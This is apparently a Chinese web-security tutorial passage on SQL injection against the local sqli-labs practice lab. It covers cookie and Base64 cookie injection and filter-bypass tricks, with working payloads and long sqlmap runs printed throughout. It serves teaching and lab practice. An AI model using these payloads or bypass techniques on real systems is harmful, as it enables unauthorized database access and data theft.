[19:20:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:20:49] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:21:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:22:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[19:22:16] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[19:22:18] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:22:22] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:22:26] [INFO] testing 'MySQL inline queries'
[19:22:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:22:51] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:23:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:23:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:24:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[19:25:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[19:25:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[19:26:05] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[19:26:48] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[19:27:31] [INFO] testing 'MySQL AND time-based blind (ELT)'
[19:28:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[19:28:15] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[19:28:17] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:28:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:29:47] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:31:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[19:32:37] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[19:34:02] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:34:02] [INFO] testing if parameter 'Referer' is dynamic
[19:34:04] [WARNING] parameter 'Referer' does not appear to be dynamic
[19:34:06] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:34:08] [INFO] testing for SQL injection on parameter 'Referer'
[19:34:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:34:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:35:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:35:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:35:38] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:35:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:35:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:35:44] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:35:46] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:36:29] [INFO] testing 'Generic inline queries'
[19:36:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:36:53] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:37:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:38:18] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:38:22] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[19:38:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[19:38:26] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:39:09] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:39:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[19:40:34] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:41:17] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[19:41:59] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[19:42:01] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[19:42:03] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:42:07] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[19:42:12] [INFO] testing 'MySQL inline queries'
[19:42:14] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:42:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:43:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:43:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:44:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[19:45:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[19:45:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[19:45:51] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[19:46:33] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[19:47:16] [INFO] testing 'MySQL AND time-based blind (ELT)'
[19:47:58] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[19:48:00] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[19:48:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[19:48:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:49:32] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:50:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[19:52:22] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[19:53:47] [WARNING] parameter 'Referer' does not seem to be injectable
[19:53:47] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next URL
[19:53:47] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'XXX\sqlmap\output\results-03102020_0654pm.csv'

[*] ending @ 19:53:47 /2020-03-10/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191
```

### 4.HTTP头中的cookie注入

服务器可以利用cookies包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。
cookies最经典的应用就是判断用户是否已经登录网站。
在浏览器的console中查看cookie信息：
![sqlmap cookie check](https://img-blog.csdnimg.cn/20200310201015572.gif#pic_center)
可以看到百度招聘的信息 ，是不是感觉逼格满满 ！！！
在实际中，代码中使用Cookie传递参数，但是没有对Cookie中传递的参数进行过滤操作，导致SQL注入漏洞的产生。
进行测试，如下：
![HTTP cookie injection test](https://img-blog.csdnimg.cn/20200310201108878.gif#pic_center)
得到报错信息：

> ‘‘admin’’ LIMIT 0,1’

修改为`' and updatexml(1,concat(0x7e,version(),0x7e),1) --+`，加入cookie再次测试：
![HTTP cookie injection test2](https://img-blog.csdnimg.cn/20200310201211359.gif#pic_center)
显然，此时通过页面的回显得到了数据库的版本。
还可以通过`'and updatexml(1,concat(0x7e,database()',0x7e),1) --+`得到数据库的版本。

#### sqlmap安全测试

通过文件指定注入点为cookie并保存文件的操作如下：
![sqlmap cookie test](https://img-blog.csdnimg.cn/20200310201416584.gif#pic_center)
通过*标注注入点为cookie参数，如`Cookie: uname=admin*; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF`，然后进行测试：

```shell
python sqlmap.py -r XXXX\target.txt --banner --batch --level 3
1
```

打印

```shell
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:08:36 /2020-03-10/

[14:08:36] [INFO] parsing HTTP request from 'XXXX\target.txt'
[14:08:37] [INFO] found a total of 2 targets
URL 1:
GET http://127.0.0.1:80/sqli-labs/Less-20/index.php
Cookie: uname=admin*; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF
do you want to test this URL? [Y/n/q]
> Y
[14:08:37] [INFO] testing URL 'http://127.0.0.1:80/sqli-labs/Less-20/index.php'
custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[14:08:37] [INFO] using 'XXX\sqlmap\output\results-03102020_0208pm.csv' as the CSV results file in multiple targets mode
[14:08:37] [INFO] testing connection to the target URL
[14:08:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:08:41] [INFO] testing if the target URL content is stable
[14:08:43] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[14:08:43] [INFO] testing if (custom) HEADER parameter 'Cookie #1*' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[14:08:45] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be dynamic
[14:08:47] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might be injectable (possible DBMS: 'MySQL')
[14:08:49] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'Cookie #1*' might be vulnerable to cross-site scripting (XSS) attacks
[14:08:49] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] Y
[14:08:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:08:51] [WARNING] reflective value(s) found and filtering out
[14:08:59] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[14:08:59] [INFO] testing 'Generic inline queries'
[14:09:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:09:03] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:09:05] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:09:07] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:09:09] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[14:09:11] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[14:09:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:09:16] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable

[14:09:16] [INFO] testing 'MySQL inline queries'
[14:09:18] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:09:18] [WARNING] time-based comparison requires larger statistical model, please wait............. (done)
[14:09:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:09:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:09:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:09:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[14:09:54] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[14:09:56] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:10:12] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[14:10:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:10:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:10:16] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:10:24] [INFO] target URL appears to have 3 columns in query
[14:10:39] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin' AND 5923=5923-- pgYe; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin' AND (SELECT 6510 FROM(SELECT COUNT(*),CONCAT(0x71626b6a71,(SELECT (ELT(6510=6510,1))),0x7170707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- BsUL; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 5241 FROM (SELECT(SLEEP(5)))QgDY)-- Yovg; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF


    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: uname=-3483' UNION ALL SELECT NULL,NULL,CONCAT(0x71626b6a71,0x68794470424245485a554f75584c426264475469635964656c73516178775061426c516350565255,0x7170707171)-- -; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF
---
do you want to exploit this SQL injection? [Y/n] Y
[14:10:39] [INFO] the back-end DBMS is MySQL
[14:10:39] [INFO] fetching banner
[14:10:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.5.53'
'14:10:51] [INFO] skipping 'http://127.0.0.1/sqli-labs/Less-20/index.php
[14:10:51] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'XXX\sqlmap\output\results-03102020_0208pm.csv'

[*] ending @ 14:10:51 /2020-03-10/


123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596
```

### 5.HTTP头中的cookie Base64注入

#### base64介绍

base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。
base64是网络上最常见的用于传输8Bit字节码的编码方式之一，是一种基于64个可打印字符来表示二进制数据的方法。
**转换方法：**
将原始内容转换为二进制，从左到右依次取6位，然后在最高补两位0，形成新的内容。
编码规则：

- 把3个字符变成4个字符
- 每76个字符加一个换行符
- 最后的结束符也要处理

base64是**可逆**的，编码后可以转换回来。
base64编码可点击http://tool.oschina.net/encrypt?type=3。

#### Base64注入

使用Base64加密的注入语句，插入到Cookie对应的位置完成SQL注入漏洞的探测，例如：
明文`" or 1=1 #`对应密文`IiBvciAxPTEgIw==`。
访问http://127.0.0.1/sqli-labs/Less-22/，并登录测试，发现会报错，这是因为没有设置时区，需要在php配置文件中进行设置并重启，再次刷新即可正常访问，操作如下：
![sqlmap cookie base64 test](https://img-blog.csdnimg.cn/20200310201931491.gif#pic_center)
可以得到界面如下：
![sqlmap cookie base64 界面](https://img-blog.csdnimg.cn/20200310201946204.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
其中有`uname = YWRtaW4=`，`YWRtaW4=`的base64解码即为admin。
将反斜线\加入admin后进行base64编码，再编辑重发，如下：
![sqlmap cookie base64 test2](https://img-blog.csdnimg.cn/2020031020212757.gif#pic_center)
报错信息如下：

> ‘“admin” LIMIT 0,1’

即发现注入点，可以进行注入测试。

#### sqlmap安全测试

获取请求内容并保存到target.txt操作如下：
![sqlmap cookie base64 test3](https://img-blog.csdnimg.cn/20200310202347780.gif#pic_center)

```shell
python sqlmap.py -r C:\Users\Lenovo\Desktop\target.txt --banner --batch --level 3 --dbms mysql --tamper base64encode.py
1
```

打印

```shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.31#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:13:42 /2020-03-10/

[19:13:42] [INFO] parsing HTTP request from 'XXXX\target.txt'
[19:13:42] [INFO] loading tamper module 'base64encode'
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[19:13:43] [INFO] testing connection to the target URL
[19:13:45] [INFO] testing if the target URL content is stable
[19:13:47] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[19:13:47] [INFO] testing if Cookie parameter 'uname' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] Y
[19:13:49] [WARNING] reflective value(s) found and filtering out
[19:13:49] [INFO] Cookie parameter 'uname' appears to be dynamic
[19:13:51] [INFO] heuristic (basic) test shows that Cookie parameter 'uname' might be injectable (possible DBMS: 'MySQL')
[19:13:53] [INFO] testing for SQL injection on Cookie parameter 'uname'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) and risk (1) values? [Y/n] Y
[19:13:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:15:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:16:44] [INFO] Cookie parameter 'uname' appears to be 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' injectable
[19:16:44] [INFO] testing 'Generic inline queries'
[19:16:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[19:16:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[19:16:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[19:16:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[19:16:54] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[19:16:56] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[19:16:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[19:17:00] [INFO] Cookie parameter 'uname' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[19:17:00] [INFO] testing 'MySQL inline queries'
[19:17:02] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[19:17:06] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[19:17:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[19:17:10] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[19:17:12] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[19:17:14] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[19:17:16] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:17:32] [INFO] Cookie parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[19:17:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:17:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:17:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[19:17:46] [INFO] target URL appears to have 3 columns in query
[19:17:51] [INFO] Cookie parameter 'uname' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
Cookie parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 112 HTTP(s) requests:
---
Parameter: uname (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: uname=YWRtaW4=" AND 2468=(SELECT (CASE WHEN (2468=2468) THEN 2468 ELSE (SELECT 7798 UNION SELECT 4608) END))-- -; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=YWRtaW4=" AND (SELECT 8260 FROM(SELECT COUNT(*),CONCAT(0x71766a7871,(SELECT (ELT(8260=8260,1))),0x716b626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND "FZVA"="FZVA; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=YWRtaW4=" AND (SELECT 1385 FROM (SELECT(SLEEP(5)))SWci) AND "YNkC"="YNkC; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: uname=YWRtaW4=" UNION ALL SELECT NULL,NULL,CONCAT(0x71766a7871,0x6970776252484979597566737647444b636c46764345464e674142776d746348467946594c456c4e,0x716b626b71)-- -; csrftoken=gdhsRRG8COXmUmcoRBvbc259rYnbPKXFpEiggOHQF9MZxMkmBsX8zavVCyuWB7oF
---
[19:17:51] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[19:17:51] [INFO] the back-end DBMS is MySQL
[19:17:51] [INFO] fetching banner
[19:18:03] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.5.53'
[19:18:03] [INFO] fetched data logged to text files under 'XXX\sqlmap\output\127.0.0.1'

[*] ending @ 19:18:03 /2020-03-10/
```

# Python全栈（五）Web安全攻防之8.XSS攻击（上）

## 一、绕过SQL注入

### 1.绕过去除注释符的SQL注入

注释符的作用：
用于标记某段代码的作用，起到对代码功能的说明作用，但是注释掉的内容不会被执行。
Mysql中的注释符：

- 单行注释
  `--+`或`--空格`或`#`
- 多行注释
  `/* 多行注释内容 */`

正常的SQL语句中，注释符起到说明作用的功能；
但是对于在利用SQL注入漏洞过程中，注释符起到**闭合单引号、多单引号、双引号、单括号、多括号**的功能。
利用注释符过滤不能成功闭合单引号时，换一种思路，利用**or ‘1’ = '1**形式的语句来闭合。
SQL中测试：

```sql
select * from users where id = '1' or '1' = '1';
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
+----+----------+------------+
8 rows in set (0.00 sec)      
12345678910111213
```

访问[http://127.0.0.1/sqli-labs/Less-23/?id=1’ or ‘1’='1](http://127.0.0.1/sqli-labs/Less-23/?id=1' or '1'='1)，显示：
![SQL注入 绕过 注释绕过](https://img-blog.csdnimg.cn/20200313141925292.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
显然，此时未报错，可以正常访问。

### 2.绕过剔除and和or的SQL注入

MySQL基础知识：

- MySQL中的大小写不敏感，大写与小写一样
- MySQL中的十六进制与URL编码
- 符号和关键字替换
  **and**替换为 **&&**，**or**替换为 **||**。

访问[http://127.0.0.1/sqli-labs/Less-25/?id=1’ or ‘1’='1](http://127.0.0.1/sqli-labs/Less-25/?id=1' or '1'='1)，提示错误信息（输入被过滤）：
![SQL注入 绕过 and or 绕过](https://img-blog.csdnimg.cn/2020031314200131.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)
可以用符号替换or和and，例如：

```sql
select * from users where id = '1' || '1' = '1';
1
```

打印

```sql
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
+----+----------+------------+
8 rows in set (0.00 sec)      
12345678910111213
```

用||和or的效果一样。
再次测试：

```sql
select * from users where username = 'admin' && password = 'admin';
1
```

打印

```sql
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  8 | admin    | admin    |
+----+----------+----------+
1 row in set (0.00 sec)    
123456
```

在进行注入测试时，访问[http://127.0.0.1/sqli-labs/Less-25/?id=1’ or ‘1’='1](http://127.0.0.1/sqli-labs/Less-25/?id=1' or '1'='1)可能会屏蔽掉or，而成了[http://127.0.0.1/sqli-labs/Less-25/?id=1’ ‘1’='1](http://127.0.0.1/sqli-labs/Less-25/?id=1' '1'='1)，此时成了在数据库中查找id为11的记录。
访问[http://127.0.0.1/sqli-labs/Less-25/?id=1’ || ‘1’='1](http://127.0.0.1/sqli-labs/Less-25/?id=1' || '1'='1)，显示：
![SQL注入 绕过 and or 绕过测试](https://img-blog.csdnimg.cn/20200313142033390.png#pic_center?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0NVRkVFQ1I=,size_16,color_FFFFFF,t_70)

#### sqlmap安全测试

```shell
python sqlmap.py -u 127.0.0.1/sqli-labs/Less-25/?id=1 --dbs --batch
1
```

打印

```shell
        ___                                                                                                                                               
       __H__                                                                                                                                              
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}                                                                                                                  
|_ -| . [']     | .'| . |                                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                                 
      |_|V...       |_|   http://sqlmap.org                                                                                                               
                                                                                                                                                          
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all appli
cable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program               
                                                                                                                                                          
[*] starting @ 19:56:04 /2020-03-12/                                                                                                                      
                                                                                                                                                          
[19:56:05] [INFO] testing connection to the target URL                                                                                                    
[19:56:07] [INFO] checking if the target is protected by some kind of WAF/IPS                                                                             
[19:56:09] [INFO] testing if the target URL content is stable                                                                                             
[19:56:11] [INFO] target URL content is stable                                                                                                            
